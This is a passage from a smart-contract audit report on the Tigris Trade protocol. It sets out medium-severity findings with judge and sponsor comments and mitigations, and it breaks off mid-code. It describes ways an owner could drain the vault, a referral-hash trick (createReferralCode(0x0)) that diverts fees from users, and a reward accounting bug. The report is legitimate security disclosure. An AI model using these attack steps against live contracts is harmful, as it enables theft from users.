impacts the rewards paid to the protocol NFT holders.</p>\n<h3 id=\"recommended-mitigation-steps-21\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-21\" aria-label=\"recommended mitigation steps 21 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Suggest replacing the formula in line 734 with below (adding back <code>\\_fees.referralFees\\*2</code>)</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"51\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">            _feePaid =</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                _positionSize</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                * (_fees.burnFees + _fees.botFees + _fees.referralFees*2 ) </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                / DIVISION_CONSTANT // divide by 100%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                + _daoFeesPaid;</span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/367#issuecomment-1408804631\">Alex the Entreprenerd (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>The warden has shown a mistake in how fees are calculated, the impact will cause a loss of yield to the protocol, however no convincing argument was made as to how this can cause a loss to depositors or users (loss of principal), for this reason, I believe Medium Severity to be the most appropriate.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/367#issuecomment-1426771208\">GainsGoblin (Tigris Trade) confirmed and  commented</a>:</strong></p>\n<blockquote>\n<p>Mitigation: <a href=\"https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419176602\">https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419176602</a> </p>\n</blockquote>\n<hr>\n<h2 id=\"m-12-centralization-risks-owner-can-freeze-withdraws-and-use-timelock-to-steal-all-funds\" style=\"position:relative;\"><a href=\"#m-12-centralization-risks-owner-can-freeze-withdraws-and-use-timelock-to-steal-all-funds\" aria-label=\"m 12 centralization risks owner can freeze withdraws and use timelock to steal all funds permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/377\">[M-12] Centralization risks: owner can freeze withdraws and use timelock to steal all funds</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/377\">0xA5DF</a>, also found by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/668\">0xSmartContract</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/648\">francoHacker</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/638\">rbserver</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/619\">kwhuo68</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/612\">yjrwkk</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/600\">0xNazgul</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/559\">peanuts</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/553\">wait</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/529\">ladboy233</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/514\">hansfriese</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/499\">philogy</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/458\">Mukund</a>,  <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/418\">0xA5DF</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/407\">__141345__</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/386\">carlitox477</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/383\">Madalad</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/370\">jadezti</a>,  <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/323\">cccz</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/321\">SmartSek</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/311\">chaduke</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/305\">hihen</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/273\">gz627</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/259\">0xbepresent</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/240\">Ruhum</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/232\">8olidity</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/224\">Faith</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/184\">imare</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/176\">HE1M</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/167\">0xdeadbeef0x</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/153\">aviggiano</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/76\">JohnnyTime</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/45\">orion</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/24\">Englave</a>, and <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/19\">gzeon</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L222-L230\">https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L222-L230</a> </p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/StableVault.sol#L78-L83\">https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/StableVault.sol#L78-L83</a> </p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/StableToken.sol#L38-L46\">https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/StableToken.sol#L38-L46</a> </p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/PairsContract.sol#L48\">https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/PairsContract.sol#L48</a></p>\n<p>The project heavily relies on nodes/oracles, which are EOAs that sign the current price.</p>\n<p>Since all functions (including withdrawing) require a recently-signed price, the owner(s) of those EOA can freeze all activity by not providing signed prices.</p>\n<p>I got from the sponsor that the owner of the contract is going to be a timelock contract.\nHowever, once the owner holds the power to pause withdrawals - that nullifies the timelock. The whole point of the timelock is to allow users to withdraw their funds when they see a pending malicious tx before it’s executed. If the owner has the power to freeze users’ funds in the contract, they wouldn’t be able to do anything while the owner executes his malicious activity.</p>\n<p>Besides that, there are also LP funds, which are locked to a certain period, and also can’t withdraw their funds when they see a pending malicious timelock tx.</p>\n<h3 id=\"impact-7\" style=\"position:relative;\"><a href=\"#impact-7\" aria-label=\"impact 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>The owner (or attacker who steals the owner’s wallet) can steal all user’s funds.</p>\n<h3 id=\"proof-of-concept-22\" style=\"position:relative;\"><a href=\"#proof-of-concept-22\" aria-label=\"proof of concept 22 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<ul>\n<li>The fact that the protocol relies on EOA signatures is pretty clear from the code and docs</li>\n<li>\n<p>The whole project relies on the ‘StableVault’ and ‘StableToken’</p>\n<ul>\n<li>The value of the ‘StableToken’ comes from the real stablecoin that’s locked in ‘StableVault’, if someone manages to empty the ‘StableVault’ from the deposited stablecoins the ‘StableToken’ would become worthless</li>\n</ul>\n</li>\n<li>\n<p>The owner has a few ways to drain all funds:</p>\n<ul>\n<li>Replace the minter via <code>StableToken.setMinter()</code>, mint more tokens, and redeem them via <code>StableVault.withdraw()</code></li>\n<li>List a fake token at <code>StableVault</code>, deposit it and withdraw real stablecoin</li>\n<li>\n<p>List a new fake asset for trading with a fake chainlink oracle, fake profit with trading with fake prices, and then withdraw</p>\n<ul>\n<li>They can prevent other users from doing the same by setting <code>maxOi</code> and opening position in the same tx</li>\n</ul>\n</li>\n<li>Replace the MetaTx forwarder and execute tx on behalf of users (e.g. transferring bonds, positions and StableToken from their account)</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"recommended-mitigation-steps-22\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-22\" aria-label=\"recommended mitigation steps 22 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<ul>\n<li>Rely on a contract (chainlink/Uniswap) solely as an oracle</li>\n<li>\n<p>Alternately, add functionality to withdraw funds at the last given price in case no signed data is given for a certain period</p>\n<ul>\n<li>You can do it by creating a challenge in which a user requests to close his position at a recent price, if no bot executes it for a while it can be executed at the last recorded price.</li>\n</ul>\n</li>\n<li>As for LPs’ funds, I don’t see an easy way around it (besides doing significant changes to the architecture of the protocol), this a risk LPs should be aware of and decide if they’re willing to accept.</li>\n</ul>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/377#issuecomment-1377601222\">TriHaz (Tigris Trade) acknowledged, but disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>We are aware of the centralization risks. Owner of contracts will be a timelock and owner will be a multi sig to reduce the centralization for now until it’s fully controlled by DAO.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/377#issuecomment-1383157493\">Alex the Entreprenerd (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>Missing setFees, but am grouping generic reports under this one as well.</p>\n<p>Also missing changes to Trading Extension and Referral Fees.</p>\n<p>This report, in conjunction with <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/648\">#648</a> effectively covers all “basic” admin privilege findings. More nuanced issues are judged separately.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-13-one-can-become-referral-of-hash-0x0-and-because-all-users-default-referral-hash-is-0x0-so-he-would-become-all-users-referral-by-default-and-earn-a-lot-of-fees-while-users-didnt-approve-it\" style=\"position:relative;\"><a href=\"#m-13-one-can-become-referral-of-hash-0x0-and-because-all-users-default-referral-hash-is-0x0-so-he-would-become-all-users-referral-by-default-and-earn-a-lot-of-fees-while-users-didnt-approve-it\" aria-label=\"m 13 one can become referral of hash 0x0 and because all users default referral hash is 0x0 so he would become all users referral by default and earn a lot of fees while users didnt approve it permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/379\">[M-13] One can become referral of hash 0x0 and because all users default referral hash is 0x0 so he would become all users referral by default and earn a lot of fees while users didn’t approve it</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/379\">unforgiven</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Referrals.sol#L20-L24\">https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Referrals.sol#L20-L24</a> </p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/TradingExtension.sol#L148-L152\">https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/TradingExtension.sol#L148-L152</a></p>\n<h3 id=\"impact-8\" style=\"position:relative;\"><a href=\"#impact-8\" aria-label=\"impact 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>By default the value of <code>_referred[user]</code> is 0x0 for all users and if one set 0x0 as his referral hash then he would become referral for all the users who didn’t set referral by default and he would earn a lot of referral funds that users didn’t approve it.</p>\n<h3 id=\"proof-of-concept-23\" style=\"position:relative;\"><a href=\"#proof-of-concept-23\" aria-label=\"proof of concept 23 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>This is <code>createReferralCode()</code> code:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"52\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function createReferralCode(bytes32 _hash) external {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(_referral[_hash] == address(0), &quot;Referral code already exists&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _referral[_hash] = _msgSender();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        emit ReferralCreated(_msgSender(), _hash);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>As you can see, attacker can become set 0x0 as his hash referral by calling <code>createReferralCode(0x0)</code> and code would set <code>_referral[0x0] = attackerAddress</code> (attacker needs to be the first one calling this).</p>\n<p>Then in the <code>getRef()</code> code the logic would return <code>attackerAddress</code> as referral for all the users who didn’t set referral.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"53\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function getRef(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address _trader</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) external view returns(address) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        return referrals.getReferral(referrals.getReferred(_trader));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>In the code, getReferred(trader) would return 0x0 because trader didn’t set referred and getReferral(0x0) would return attackerAddress.</p>\n<p><code>_handleOpenFees()</code> and <code>_handleCloseFees()</code> function in the Trading contract would use <code>getRef(trader)</code> and they would transfer referral fee to attackerAddress and attacker would receive fee from a lot of users which didn’t set any referral, those users didn’t set any referral and didn’t approve attacker receiving referral fees from them and because most of the users wouldn’t know about this and referral codes so attacker would receive a lot of funds.</p>\n<h3 id=\"tools-used-11\" style=\"position:relative;\"><a href=\"#tools-used-11\" aria-label=\"tools used 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VIM</p>\n<h3 id=\"recommended-mitigation-steps-23\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-23\" aria-label=\"recommended mitigation steps 23 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Prevent someone from setting 0x0 hash for their referral code.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/379#issuecomment-1363604388\">TriHaz (Tigris Trade) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>It is valid but I’m not 100% sure it should be a High risk. Would like an opinion from a judge.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/379#issuecomment-1385583666\">Alex the Entreprenerd (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has shown how, due to an incorrect assumption, the first claimer to the 0 hash will receive referral fees for all non-referred users.</p>\n<p>Because the finding creates a negative externality and shows a way to extract value from what would be assumed to be the null value, I believe the finding to be of Medium Severity.</p>\n<p>I’d recommend the Sponsor either mitigate or set themselves as the 0 hash recipient as a way to receive default fees.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/379#issuecomment-1407760281\">GainsGoblin (Tigris Trade) resolved</a>:</strong></p>\n<blockquote>\n<p>Mitigation: <a href=\"https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419175772\">https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419175772</a> </p>\n</blockquote>\n<hr>\n<h2 id=\"m-14-bondnftsolclaim-needs-to-correct-all-the-missing-epochs\" style=\"position:relative;\"><a href=\"#m-14-bondnftsolclaim-needs-to-correct-all-the-missing-epochs\" aria-label=\"m 14 bondnftsolclaim needs to correct all the missing epochs permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/392\">[M-14] <code>BondNFT.sol#claim()</code> needs to correct all the missing epochs</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/392\">__141345__</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L177-L183\">https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L177-L183</a> </p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L235-L242\">https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L235-L242</a></p>\n<h3 id=\"impact-9\" style=\"position:relative;\"><a href=\"#impact-9\" aria-label=\"impact 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>In <code>BondNFT.sol#claim()</code>, <code>accRewardsPerShare[][]</code> is amended to reflect the expired shares. But only <code>accRewardsPerShare[bond.asset][epoch[bond.asset]]</code> is updated. All the epochs between <code>bond.expireEpoch-1</code> and <code>epoch[bond.asset]</code> are missed.</p>\n<p>However, some users claimable rewards calculation could be based on the missed epochs. As a result, the impact might be:</p>\n<ul>\n<li><code>accRewardsPerShare</code> is inaccurate for the epochs in between.</li>\n<li>Some users could lose reward due to wrong <code>accRewardsPerShare</code>, some users might receive undeserved rewards.</li>\n<li>Some rewards will be locked in the contract.</li>\n</ul>\n<h3 id=\"proof-of-concept-24\" style=\"position:relative;\"><a href=\"#proof-of-concept-24\" aria-label=\"proof of concept 24 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The rationale behind the unchecked block below seems to take into account the shares of reward of the expired bond. However, if you only update the latest epoch data, the epochs in between could have errors and lead to loss of other users.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"54\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">BondNFT</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">168</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">claim</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">169:         </span><span class=\"mtk10\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_id</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">170:         </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_claimer</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">171</span><span class=\"mtk1\">:     ) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyManager</span><span class=\"mtk1\">() </span><span class=\"mtk11\">returns</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tigAsset</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span 